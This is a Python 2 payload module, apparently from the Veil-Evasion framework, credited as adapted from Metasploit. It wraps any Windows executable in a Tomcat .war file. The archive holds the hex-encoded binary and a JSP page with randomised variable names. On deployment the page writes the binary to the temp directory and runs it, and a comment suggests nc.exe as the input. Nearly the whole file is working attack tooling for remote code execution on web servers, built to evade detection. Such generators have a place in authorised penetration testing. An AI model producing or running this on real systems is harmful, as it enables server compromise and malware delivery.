"""

Auxiliary module that takes an executable file (.exe) and converts
it into a .war file, specifically for deploying against Tomcat.

99% of the code came from the metasploit project and their war payload creation techniques

by @christruncer

"""

from modules.common import helpers
from binascii import hexlify
import settings
import zipfile
import random
import string
import os
import sys

class Payload:

    def __init__(self):
        # required options
        self.description = "Auxiliary script which converts a .exe file to .war"
        self.language = "python"
        self.rating = "Normal"
        self.extension = "war"

        self.required_options = {
                                    "ORIGINAL_EXE" : ["", "Path to a .exe file to convert to .war file"]  #/usr/share/windows-binaries/nc.exe
                                }


    def generate(self):

        # Set up all our variables
        var_hexpath = helpers.randomString()
        var_exepath = helpers.randomString()
        var_data = helpers.randomString()
        var_inputstream = helpers.randomString()
        var_outputstream = helpers.randomString()
        var_numbytes = helpers.randomString()
        var_bytearray = helpers.randomString()
        var_bytes = helpers.randomString()
        var_counter = helpers.randomString()
        var_char1 = helpers.randomString()
        var_char2 = helpers.randomString()
        var_comb = helpers.randomString()
        var_exe = helpers.randomString()
        var_hexfile = helpers.randomString()
        var_proc = helpers.randomString()
        var_name = helpers.randomString()
        var_payload = helpers.randomString()
        random_war_name = helpers.randomString()

        # Variables for path to our executable input and war output
        ORIGINAL_EXE = self.required_options["ORIGINAL_EXE"][0]
        war_file = settings.PAYLOAD_COMPILED_PATH + random_war_name + ".war"

        try:
            # read in the executable
            raw = open(ORIGINAL_EXE, 'rb').read()
            txt_exe = hexlify(raw)
            txt_payload_file = open(var_hexfile + ".txt", 'w')
            txt_payload_file.write(txt_exe)
            txt_payload_file.close()
        except IOError:
            print helpers.color("\n [!] ORIGINAL_EXE file \"" + ORIGINAL_EXE + "\" not found\n", warning=True)
            return ""

        # Set up our JSP files used for triggering the payload within the war file
        jsp_payload =  "<%@ page import=\"java.io.*\" %>\n"
        jsp_payload += "<%\n"
        jsp_payload += "String " + var_hexpath + " = application.getRealPath(\"/\") + \"" + var_hexfile + ".txt\";\n"
        jsp_payload += "String " + var_exepath + " = System.getProperty(\"java.io.tmpdir\") + \"/" + var_exe + "\";\n"
        jsp_payload += "String " + var_data + " = \"\";\n"
        jsp_payload += "if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") != -1){\n"
        jsp_payload += var_exepath + " = " + var_exepath + ".concat(\".exe\");\n"
        jsp_payload += "}\n"
        jsp_payload += "FileInputStream " + var_inputstream + " = new FileInputStream(" + var_hexpath + ");\n"
        jsp_payload += "FileOutputStream " + var_outputstream + " = new FileOutputStream(" + var_exepath + ");\n"
        jsp_payload += "int " + var_numbytes + " = " + var_inputstream + ".available();\n"
        jsp_payload += "byte " + var_bytearray + "[] = new byte[" + var_numbytes + "];\n"
        jsp_payload += var_inputstream + ".read(" + var_bytearray + ");\n"
        jsp_payload += var_inputstream + ".close();\n"
        jsp_payload += "byte[] " + var_bytes + " = new byte[" + var_numbytes + "/2];\n"
        jsp_payload += "for (int " + var_counter + " = 0; " + var_counter + " < " + var_numbytes + "; " + var_counter + " += 2)\n"
        jsp_payload += "{\n"
        jsp_payload += "char " + var_char1 + " = (char) " + var_bytearray + "[" + var_counter + "];\n"
        jsp_payload += "char " + var_char2 + " = (char) " + var_bytearray + "[" + var_counter+ " + 1];\n"
        jsp_payload += "int " + var_comb + " = Character.digit(" + var_char1 + ", 16) & 0xff;\n"
        jsp_payload += var_comb + " <<= 4;\n"
        jsp_payload += var_comb + " += Character.digit(" + var_char2 + ", 16) & 0xff;\n"
        jsp_payload += var_bytes + "[" + var_counter + "/2] = (byte)" + var_comb + ";\n"
        jsp_payload += "}\n"
        jsp_payload += var_outputstream + ".write(" + var_bytes + ");\n"
        jsp_payload += var_outputstream + ".close();\n"
        jsp_payload += "Process " + var_proc + " = Runtime.getRuntime().exec(" + var_exepath + ");\n"
        jsp_payload += "%>\n"

        # Write out the jsp code to file
        jsp_file_out = open(var_payload + ".jsp", 'w')
        jsp_file_out.write(jsp_payload)
        jsp_file_out.close()

        # MANIFEST.MF file contents, and write it out to disk
        manifest_file = "Manifest-Version: 1.0\r\nCreated-By: 1.6.0_17 (Sun Microsystems Inc.)\r\n\r\n"
        man_file = open("MANIFEST.MF", 'w')
        man_file.write(manifest_file)
        man_file.close()

        # web.xml file contents
        web_xml_contents = "<?xml version=\"1.0\"?>\n"
        web_xml_contents += "<!DOCTYPE web-app PUBLIC\n"
        web_xml_contents += "\"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN\"\n"
        web_xml_contents += "\"http://java.sun.com/dtd/web-app_2_3.dtd\">\n"
        web_xml_contents += "<web-app>\n"
        web_xml_contents += "<servlet>\n"
        web_xml_contents += "<servlet-name>" + var_name + "</servlet-name>\n"
        web_xml_contents += "<jsp-file>/" + var_payload + ".jsp</jsp-file>\n"
        web_xml_contents += "</servlet>\n"
        web_xml_contents += "</web-app>\n"

        # Write the web.xml file to disk
        xml_file = open("web.xml", 'w')
        xml_file.write(web_xml_contents)
        xml_file.close()

        # Create the directories needed for the war file, and move the needed files into them
        os.system("mkdir -p META-INF")
        os.system("mkdir -p WEB-INF")
        os.system("mv -f web.xml WEB-INF/")
        os.system("mv -f MANIFEST.MF META-INF/")

        # Make the war file by zipping everything together
        myZipFile = zipfile.ZipFile(war_file, 'w')
        myZipFile.write(var_payload + ".jsp", var_payload + ".jsp", zipfile.ZIP_DEFLATED)
        myZipFile.write(var_hexfile + ".txt", var_hexfile + ".txt", zipfile.ZIP_DEFLATED)
        myZipFile.write("META-INF/MANIFEST.MF", "META-INF/MANIFEST.MF", zipfile.ZIP_DEFLATED)
        myZipFile.write("WEB-INF/web.xml", "WEB-INF/web.xml", zipfile.ZIP_DEFLATED)
        myZipFile.close()

        f = open(war_file, 'r')
        war_payload = f.read()
        f.close()

        # Clean up the individual files, you can always unzip the war to see them again
        os.system("rm -rf WEB-INF")
        os.system("rm -rf META-INF")
        os.system("rm -f " + var_payload + ".jsp")
        os.system("rm -f " + var_hexfile + ".txt")
        os.system("rm -f " + war_file)

        PayloadCode = war_payload

        # Return
        return PayloadCode
